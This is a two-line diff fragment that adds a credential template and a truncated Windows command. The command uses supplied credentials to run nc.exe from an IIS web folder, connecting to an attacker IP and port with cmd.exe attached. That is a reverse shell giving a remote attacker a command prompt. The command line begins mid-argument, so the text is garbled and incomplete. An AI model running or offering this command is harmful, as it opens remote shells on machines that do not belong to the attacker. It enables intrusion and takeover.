@@ -1,0 +1,2 @@
+"userName:""password""@ipAddress"
+username> -p <password> \\MACHINENAME C:\Inetpub\nc.exe <attackerip> <attackerport> -e C:\windows\system32\cmd.exe
